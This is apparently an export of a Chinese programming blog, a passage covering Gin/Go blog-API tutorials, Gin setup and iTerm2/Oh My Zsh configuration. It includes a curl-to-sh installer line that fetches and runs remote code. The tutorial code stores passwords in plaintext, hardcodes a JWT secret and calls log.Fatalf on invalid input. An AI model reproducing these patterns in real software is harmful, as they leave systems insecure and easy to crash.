function">StrTo</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">MustInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        maps<span class="token punctuation">[</span><span class="token string">"state"</span><span class="token punctuation">]</span> <span class="token operator">=</span> state    <span class="token punctuation">}</span>    code <span class="token operator">:=</span> e<span class="token punctuation">.</span>SUCCESS    data<span class="token punctuation">[</span><span class="token string">"lists"</span><span class="token punctuation">]</span> <span class="token operator">=</span> models<span class="token punctuation">.</span><span class="token function">GetTags</span><span class="token punctuation">(</span>util<span class="token punctuation">.</span><span class="token function">Getpag</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>setting<span class="token punctuation">.</span>Pagesize<span class="token punctuation">,</span>maps<span class="token punctuation">)</span>    data<span class="token punctuation">[</span><span class="token string">"total"</span><span class="token punctuation">]</span> <span class="token operator">=</span> models<span class="token punctuation">.</span><span class="token function">GetTotal</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>    c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusOK<span class="token punctuation">,</span>gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>        <span class="token string">"code"</span> <span class="token punctuation">:</span> code<span class="token punctuation">,</span>        <span class="token string">"msg"</span> <span class="token punctuation">:</span> e<span class="token punctuation">.</span><span class="token function">GetMsg</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"data"</span> <span class="token punctuation">:</span> data<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">AddTags</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 新增tags</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">EditTags</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 更新tags</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">DeleteTags</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 删除tags</span><span class="token punctuation">}</span></code></pre><ul><li><p>c.Query可用于获取?name=test&amp;state=1这类URL参数，而c.DefaultQuery则支持设置一个默认值.</p></li><li><p>code变量使用了e模块的错误编码，这正是先前规划好的错误码，方便排错和识别记录.</p></li><li><p>util.GetPag保证了各接口的page处理是一致的</p></li><li><p>c *gin.Context是Gin很重要的组成部分，可以理解为上下文，它允许我们在中间件之间传递变量、管理流、验证请求的JSON和呈现JSON响应</p><p>当我go run main.go的时候出现了错误。</p><pre class=" language-go"><code class="language-go">$ <span class="token keyword">go</span> run main<span class="token punctuation">.</span><span class="token keyword">go</span># gin<span class="token operator">-</span>blog<span class="token operator">/</span>modelsmodels\models<span class="token punctuation">.</span><span class="token keyword">go</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span> cannot refer to unexported name setting<span class="token punctuation">.</span>cfgmodels\models<span class="token punctuation">.</span><span class="token keyword">go</span><span class="token punctuation">:</span><span class="token number">27</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span> undefined<span class="token punctuation">:</span> setting<span class="token punctuation">.</span>cfg</code></pre><p>经过各种排查，终于知道了，当初我定义config *ini.File.而模块中导出的函数必须为字母大写。<br>现在我们再运行程序。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> run main<span class="token punctuation">.</span><span class="token keyword">go</span>curl <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">8000</span><span class="token operator">/</span>api<span class="token operator">/</span>v1<span class="token operator">/</span>tags<span class="token punctuation">{</span><span class="token string">"code"</span><span class="token punctuation">:</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"lists"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"total"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"ok"</span><span class="token punctuation">}</span></code></pre><h2 id="编写新增标签的models逻辑"><a href="#编写新增标签的models逻辑" class="headerlink" title="编写新增标签的models逻辑"></a>编写新增标签的models逻辑</h2><p>修改models目录下的tag.go文件。(新增)</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">ExistTagByName</span><span class="token punctuation">(</span>name <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">{</span> <span class="token keyword">var</span> tag Tag db<span class="token punctuation">.</span><span class="token function">Select</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Where</span><span class="token punctuation">(</span><span class="token string">"name = ?"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">First</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tag<span class="token punctuation">)</span> <span class="token keyword">if</span> tag<span class="token punctuation">.</span>ID <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">{</span>     <span class="token keyword">return</span> <span class="token boolean">true</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">}</span></code></pre></li></ul><p>func AddTag(name string, state int, createdBy string) bool{<br>    db.Create(&amp;Tag {<br>        Name : name,<br>        State : state,<br>        CreatedBy : createdBy,<br>    })</p><pre><code>return true</code></pre><p>}</p><pre><code>## 编写新增标签的路由逻辑。修改routers目录下v1下的tag.go。```gofunc AddTags(c *gin.Context) {    // 新增tags    name := c.Query(&quot;name&quot;)    state := com.StrTo(c.DefaultQuery(&quot;state&quot;, &quot;0&quot;)).MustInt()    createdBy := c.Query(&quot;created_by&quot;)    valid := validation.Validation{}    valid.Required(name, &quot;name&quot;).Message(&quot;名称不能为空&quot;)    valid.MaxSize(name, 100, &quot;name&quot;).Message(&quot;名称最长为100&quot;)    valid.Required(createdBy, &quot;created_by&quot;).Message(&quot;创建人不能为空&quot;)    valid.MaxSize(createdBy, 100, &quot;created_by&quot;).Message(&quot;创建人不能大于100&quot;)    valid.Range(state, 0, 1, &quot;state&quot;).Message(&quot;状态只能0或1&quot;)    code := e.INVALID_PARAMS    if !valid.HasErrors() {        if !models.ExistTagByName(name) {            code = e.SUCCESS            models.AddTag(name, state, createdBy)        } else {            code = e.ERROR_EXIST_TAG        }    } else {        for _, err := range valid.Errors {            log.Fatalf(&quot;fail %v&quot;, err.Message)            // logging.Info(err.Key,err.Message)        }    }    c.JSON(http.StatusOK, gin.H{        &quot;code&quot;: code,        &quot;msg&quot;:  e.GetMsg(code),        &quot;data&quot;: make(map[string]string),    })}</code></pre><h4 id="编写models-callbacks"><a href="#编写models-callbacks" class="headerlink" title="编写models callbacks"></a>编写models callbacks</h4><p>但是这个时候大家会发现，我明明新增了标签，但created_on居然没有值，那做修改标签的时候modified_on会不会也存在这个问题？为了解决这个问题，我们需要打开models目录下的tag.go文件，修改文件内容（修改包引用和增加2个方法）：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>tag <span class="token operator">*</span>Tag<span class="token punctuation">)</span> <span class="token function">BeforeCreate</span><span class="token punctuation">(</span>scope <span class="token operator">*</span>gorm<span class="token punctuation">.</span>Scope<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>    scope<span class="token punctuation">.</span><span class="token function">SetColumn</span><span class="token punctuation">(</span><span class="token string">"CreatedOn"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Unix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>tag <span class="token operator">*</span>Tag<span class="token punctuation">)</span> <span class="token function">BeforeUpdate</span><span class="token punctuation">(</span>scope <span class="token operator">*</span>gorm<span class="token punctuation">.</span>Scope<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>    scope<span class="token punctuation">.</span><span class="token function">SetColumn</span><span class="token punctuation">(</span><span class="token string">"ModifiedOn"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Unix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
            <tag> gin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gin 环境搭建</title>
      <link href="/2018/10/24/gin-huan-jing-da-jian/"/>
      <url>/2018/10/24/gin-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="Gin-环境搭建"><a href="#Gin-环境搭建" class="headerlink" title="Gin 环境搭建"></a>Gin 环境搭建</h1><blockquote><p>Gin是用Golang开发的一个微框架，类似Martinier的API，重点是小巧、易用、性能好很多，也因为 <a href="https://github.com/julienschmidt/httprouter" target="_blank" rel="noopener">httprouter</a> 的性能提高了40倍。</p></blockquote><h2 id="1-安装Golang"><a href="#1-安装Golang" class="headerlink" title="1.安装Golang"></a>1.安装Golang</h2><p>根据自己环境安装对应的环境。  </p><h2 id="2-安装Govendor"><a href="#2-安装Govendor" class="headerlink" title="2.安装Govendor"></a>2.安装Govendor</h2><p>GOlang包管理工具 </p><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> get <span class="token operator">-</span>u github<span class="token punctuation">.</span>com<span class="token operator">/</span>kardianos<span class="token operator">/</span>govendorgovendor <span class="token operator">-</span>version有版本号说明安装成功啦。</code></pre><h2 id="3-安装Gin"><a href="#3-安装Gin" class="headerlink" title="3.安装Gin"></a>3.安装Gin</h2><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> get <span class="token operator">-</span>u github<span class="token punctuation">.</span>com<span class="token operator">/</span>gin<span class="token operator">-</span>gonic<span class="token operator">/</span>gin</code></pre><p>以下测试代码</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"github.com/gin-gonic/gin"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/ping"</span><span class="token punctuation">,</span><span class="token keyword">func</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span><span class="token punctuation">{</span>        c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span>gin<span class="token punctuation">.</span>H<span class="token punctuation">{</span>            <span class="token string">"message"</span><span class="token punctuation">:</span><span class="token string">"tong"</span><span class="token punctuation">,</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// listen and serve on 0.0.0.0:8080</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">go</span> run xxx<span class="token punctuation">.</span><span class="token keyword">go</span></code></pre><p>访问127.0.0.1:8080/ping，若返回{“message”:”tong”}则正确</p><pre class=" language-bash"><code class="language-bash">curl  127.0.0.1:8080/ping </code></pre><pre class=" language-bash"><code class="language-bash"> % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100    18  100    18    0     0    391      0 --:--:-- --:--:-- --:--:--   391<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token keyword">:</span><span class="token string">"tong"</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
            <tag> golang </tag>
            
            <tag> gin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iTerm2耍一耍</title>
      <link href="/2018/10/24/iterm2-shua-yi-shua/"/>
      <url>/2018/10/24/iterm2-shua-yi-shua/</url>
      
        <content type="html"><![CDATA[<h1 id="iTerm2耍一耍"><a href="#iTerm2耍一耍" class="headerlink" title="iTerm2耍一耍"></a>iTerm2耍一耍</h1><h2 id="安装iTerm2"><a href="#安装iTerm2" class="headerlink" title="安装iTerm2"></a>安装<a href="https://www.iterm2.com/" target="_blank" rel="noopener">iTerm2</a></h2><pre><code>brew cask install iterm2</code></pre><h2 id="配置iTerm2主题"><a href="#配置iTerm2主题" class="headerlink" title="配置iTerm2主题"></a>配置iTerm2主题</h2><h3 id="最常用的主题就属于它了Solarized-Dark-theme果断下载。"><a href="#最常用的主题就属于它了Solarized-Dark-theme果断下载。" class="headerlink" title="最常用的主题就属于它了Solarized Dark theme果断下载。"></a>最常用的主题就属于它了<a href="https://ethanschoonover.com/solarized/" target="_blank" rel="noopener">Solarized Dark theme</a>果断下载。</h3><h4 id="打开iTerm2-到达preferences"><a href="#打开iTerm2-到达preferences" class="headerlink" title="打开iTerm2,到达preferences"></a>打开iTerm2,到达preferences</h4><p><img src="/.io//color.png" alt="color">  </p><h2 id="配置Oh-My-ZSH"><a href="#配置Oh-My-ZSH" class="headerlink" title="配置Oh My ZSH"></a>配置<a href="https://ohmyz.sh/" target="_blank" rel="noopener">Oh My ZSH</a></h2><pre class=" language-bash"><code class="language-bash">sh -c <span class="token string">"<span class="token variable"><span class="token variable">$(</span>curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh<span class="token variable">)</span></span>"</span></code></pre><p><img src="/.io//zsh.png" alt="zsh">)  </p><h4 id="出现这个说明安装成功。然后修改-zshrc，修改主题为ys"><a href="#出现这个说明安装成功。然后修改-zshrc，修改主题为ys" class="headerlink" title="出现这个说明安装成功。然后修改.zshrc，修改主题为ys"></a>出现这个说明安装成功。然后修改.zshrc，修改主题为ys</h4><pre><code>ZSH_THEME=&quot;ys&quot;</code></pre><h4 id="重新打开窗口。"><a href="#重新打开窗口。" class="headerlink" title="重新打开窗口。"></a>重新打开窗口。</h4><p><img src="/.io//ys.png" alt="ys"></p><h4 id="或者你可以修改为agnoster。"><a href="#或者你可以修改为agnoster。" class="headerlink" title="或者你可以修改为agnoster。"></a>或者你可以修改为agnoster。</h4><pre><code>ZSH_THEME=&quot;agnoster&quot;</code></pre><ul><li><h4 id="下载字体Meslo"><a href="#下载字体Meslo" class="headerlink" title="下载字体Meslo"></a>下载字体<a href="https://github.com/powerline/fonts/blob/master/Meslo%20Slashed/Meslo%20LG%20M%20Regular%20for%20Powerline.ttf" target="_blank" rel="noopener">Meslo</a></h4></li><li><h4 id="安装上字体。"><a href="#安装上字体。" class="headerlink" title="安装上字体。"></a>安装上字体。</h4><img src="/.io//font.png" alt="font"><br><img src="/.io//agnoster.png" alt="agnoster"></li></ul><h3 id="有人说需要自己安装才能自动提示，我安装完tab自动补全，自动提示都有了。没有的自行百度。风格就看自己喜欢什么的的来选吧。"><a href="#有人说需要自己安装才能自动提示，我安装完tab自动补全，自动提示都有了。没有的自行百度。风格就看自己喜欢什么的的来选吧。" class="headerlink" title="有人说需要自己安装才能自动提示，我安装完tab自动补全，自动提示都有了。没有的自行百度。风格就看自己喜欢什么的的来选吧。"></a>有人说需要自己安装才能自动提示，我安装完tab自动补全，自动提示都有了。没有的自行百度。风格就看自己喜欢什么的的来选吧。</h3>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iTerm2 </tag>
            
            <tag> mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gin搭建Blog API&#39;s（一）</title>
      <link href="/2018/10/24/gin-da-jian-blog-api-s-yi/"/>
      <url>/2018/10/24/gin-da-jian-blog-api-s-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="Gin搭建Blog-API’s（一）"><a href="#Gin搭建Blog-API’s（一）" class="headerlink" title="Gin搭建Blog API’s（一）"></a>Gin搭建Blog API’s（一）</h1><p>按照<a href="https://github.com/EDDYCJY/blog/blob/master/golang/gin/2018-02-16-Gin%E5%AE%9E%E8%B7%B5-%E8%BF%9E%E8%BD%BD%E4%BA%8C-%E6%90%AD%E5%BB%BABlogAPIs-01.md" target="_blank" rel="noopener">Gin搭建Blog API’s (一)</a>教程来的。此为原作者。</p><p>本教程利用一款读写配置文件的库。<a href="https://ini.unknwon.io" target="_blank" rel="noopener">INI</a>,请提前阅读。</p><h2 id="1-介绍和初始化项目"><a href="#1-介绍和初始化项目" class="headerlink" title="1.介绍和初始化项目"></a>1.介绍和初始化项目</h2><p>创建新的工作区，在src目录创建gin-blog.</p><pre><code>$GOPATH├── bin├── pkg└── src    └── gin-blog</code></pre><h3 id="初始化项目目录"><a href="#初始化项目目录" class="headerlink" title="初始化项目目录"></a>初始化项目目录</h3><pre><code>gin-blog/├── conf├── middleware├── models├── pkg├── routers└── runtime</code></pre><ul><li><h4 id="conf：用于存储配置文件"><a href="#conf：用于存储配置文件" class="headerlink" title="conf：用于存储配置文件"></a>conf：用于存储配置文件</h4></li><li><h4 id="middleware：应用中间件"><a href="#middleware：应用中间件" class="headerlink" title="middleware：应用中间件"></a>middleware：应用中间件</h4></li><li><h4 id="models：应用数据库模型"><a href="#models：应用数据库模型" class="headerlink" title="models：应用数据库模型"></a>models：应用数据库模型</h4></li><li><h4 id="pkg：第三方包"><a href="#pkg：第三方包" class="headerlink" title="pkg：第三方包"></a>pkg：第三方包</h4></li><li><h4 id="routers-路由逻辑处理"><a href="#routers-路由逻辑处理" class="headerlink" title="routers 路由逻辑处理"></a>routers 路由逻辑处理</h4></li><li><h4 id="runtime-应用运行时数据"><a href="#runtime-应用运行时数据" class="headerlink" title="runtime 应用运行时数据"></a>runtime 应用运行时数据</h4></li></ul><h3 id="初始项目数据库"><a href="#初始项目数据库" class="headerlink" title="初始项目数据库"></a>初始项目数据库</h3><ul><li><h3 id="下载安装数据库（mysql）"><a href="#下载安装数据库（mysql）" class="headerlink" title="下载安装数据库（mysql）"></a>下载安装数据库（mysql）</h3></li><li><h3 id="新建blog数据库"><a href="#新建blog数据库" class="headerlink" title="新建blog数据库"></a>新建blog数据库</h3><a href="https://postimg.cc/QHs8bbTY" target="_blank" rel="noopener">database.png</a><br><a href="https://postimg.cc/QHs8bbTY" target="_blank" rel="noopener"><img src="https://i.postimg.cc/kXR27YXC/database.png" alt="database.png"></a><h3 id="创建blog数据库后，创建以下表格："><a href="#创建blog数据库后，创建以下表格：" class="headerlink" title="创建blog数据库后，创建以下表格："></a>创建blog数据库后，创建以下表格：</h3><h4 id="1-标签表"><a href="#1-标签表" class="headerlink" title="1.标签表"></a>1.标签表</h4><pre class=" language-mysql"><code class="language-mysql">CREATE TABLE `blog_tag` (`id` int(10) unsigned NOT NULL AUTO_INCREMENT,`name` varchar(100) DEFAULT '' COMMENT '标签名称',`created_on` int(10) unsigned DEFAULT '0' COMMENT '创建时间',`created_by` varchar(100) DEFAULT '' COMMENT '创建人',`modified_on` int(10) unsigned DEFAULT '0' COMMENT '修改时间',`modified_by` varchar(100) DEFAULT '' COMMENT '修改人',`state` tinyint(3) unsigned DEFAULT '1' COMMENT '状态 0为禁用、1为启用',PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='文章标签管理';</code></pre><a href="https://postimg.cc/KKghFkTg" target="_blank" rel="noopener">database1.png</a><br><a href="https://postimg.cc/KKghFkTg" target="_blank" rel="noopener"><img src="https://i.postimg.cc/s2TjY5DK/database1.png" alt="database1.png"></a><h4 id="2-文章表"><a href="#2-文章表" class="headerlink" title="2.文章表"></a>2.文章表</h4><pre class=" language-mysql"><code class="language-mysql">CREATE TABLE `blog_article` (`id` int(10) unsigned NOT NULL AUTO_INCREMENT,`tag_id` int(10) unsigned DEFAULT '0' COMMENT '标签ID',`title` varchar(100) DEFAULT '' COMMENT '文章标题',`desc` varchar(255) DEFAULT '' COMMENT '简述',`content` text,`created_on` int(11) DEFAULT NULL,`created_by` varchar(100) DEFAULT '' COMMENT '创建人',`modified_on` int(10) unsigned DEFAULT '0' COMMENT '修改时间',`modified_by` varchar(255) DEFAULT '' COMMENT '修改人',`state` tinyint(3) unsigned DEFAULT '1' COMMENT '状态 0为禁用1为启用',PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='文章管理';</code></pre><a href="https://postimg.cc/XXgJtm46" target="_blank" rel="noopener">database2.png</a><br><a href="https://postimg.cc/XXgJtm46" target="_blank" rel="noopener"><img src="https://i.postimg.cc/jqp7nY12/database2.png" alt="database2.png"></a><h4 id="3-认证表"><a href="#3-认证表" class="headerlink" title="3.认证表"></a>3.认证表</h4><pre class=" language-mysql"><code class="language-mysql">CREATE TABLE `blog_auth` (`id` int(10) unsigned NOT NULL AUTO_INCREMENT,`username` varchar(50) DEFAULT '' COMMENT '账号',`password` varchar(50) DEFAULT '' COMMENT '密码',PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></pre></li></ul><p>INSERT INTO <code>blog</code>.<code>blog_auth</code> (<code>id</code>, <code>username</code>, <code>password</code>) VALUES (null, ‘test’, ‘test123456’);</p><pre><code>[database3.png](https://postimg.cc/6TB6VcRj)[![database3.png](https://i.postimg.cc/sfhBr02r/database3.png)](https://postimg.cc/6TB6VcRj)  ## 2.编写项目配置包### 下载依赖包[go-ini/ini](https://github.com/go-ini/ini)```gogo get -u  github.com/go-ini/ini</code></pre><h3 id="在gin-blog的conf目录下创建app-ini文件"><a href="#在gin-blog的conf目录下创建app-ini文件" class="headerlink" title="在gin-blog的conf目录下创建app.ini文件"></a>在gin-blog的conf目录下创建app.ini文件</h3><pre><code>#debug or releaseRUN_MODE = debug[app]PAGE_SIZE = 10JWT_SECRET = 23347$040412[server]HTTP_PORT = 8000READ_TIMEOUT = 60WRITE_TIMEOUT = 60[database]TYPE = mysqlUSER = 数据库账号PASSWORD = 数据库密码#127.0.0.1:3306HOST = 数据库IP:数据库端口号NAME = blogTABLE_PREFIX = blog_</code></pre><h3 id="建立配置setting模块，在pkg目录下创建setting目录，并且创建setting-go文件。"><a href="#建立配置setting模块，在pkg目录下创建setting目录，并且创建setting-go文件。" class="headerlink" title="建立配置setting模块，在pkg目录下创建setting目录，并且创建setting.go文件。"></a>建立配置setting模块，在pkg目录下创建setting目录，并且创建setting.go文件。</h3><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> setting<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"time"</span>    <span class="token string">"log"</span>    <span class="token string">"github.com/go-ini/ini"</span><span class="token punctuation">)</span><span class="token keyword">var</span> <span class="token punctuation">(</span>    config <span class="token operator">*</span>ini<span class="token punctuation">.</span>File    RunModel <span class="token builtin">string</span>    Httpport <span class="token builtin">int</span>    ReadTimeOut time<span class="token punctuation">.</span>Duration    WriteTimeOut time<span class="token punctuation">.</span>Duration    Pagesize <span class="token builtin">int</span>    Jwtsecret <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> err <span class="token builtin">error</span>    config<span class="token punctuation">,</span> err <span class="token operator">=</span> ini<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token string">"conf/app.ini"</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"Fail to read file: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">LoadBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">LoadServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">LoadApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">LoadBase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    RunModel <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token function">Section</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"RUN_MODE"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">MustString</span><span class="token punctuation">(</span><span class="token string">"debug"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">LoadServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    ser<span class="token punctuation">,</span> err <span class="token operator">:=</span> config<span class="token punctuation">.</span><span class="token function">GetSection</span><span class="token punctuation">(</span><span class="token string">"server"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"Fail to get selection %v"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    RunModel <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token function">Section</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"RUN_MODE"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">MustString</span><span class="token punctuation">(</span><span class="token string">"debug"</span><span class="token punctuation">)</span>    Httpport <span class="token operator">=</span> ser<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"HTTP_PORT"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">MustInt</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span>    ReadTimeOut <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">Duration</span><span class="token punctuation">(</span>ser<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"READ_TIMEOUT"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">MustInt</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second    WriteTimeOut <span class="token operator">=</span> time<span class="token punctuation">.</span><span class="token function">Duration</span><span class="token punctuation">(</span>ser<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"WRITE_TIMEOUT"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">MustInt</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Second<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">LoadApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    App<span class="token punctuation">,</span> err <span class="token operator">:=</span> config<span class="token punctuation">.</span><span class="token function">GetSection</span><span class="token punctuation">(</span><span class="token string">"app"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">"Fail to get selection %v"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    Pagesize <span class="token operator">=</span> App<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"PAGE_SIZE"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">MustInt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    Jwtsecret <span class="token operator">=</span> App<span class="token punctuation">.</span><span class="token function">Key</span><span class="token punctuation">(</span><span class="token string">"JWT_SECRET"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">MustString</span><span class="token punctuation">(</span><span class="token string">"!@)*#)!@U#@*!@!)"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h4 id="目录树"><a href="#目录树" class="headerlink" title="目录树"></a>目录树</h4><pre><code>└─gin-blog    │  test.go    │    ├─conf    │      app.ini    │    ├─middleware    ├─models    ├─pkg    │      setting.go    │    ├─routers    └─runtime</code></pre><h2 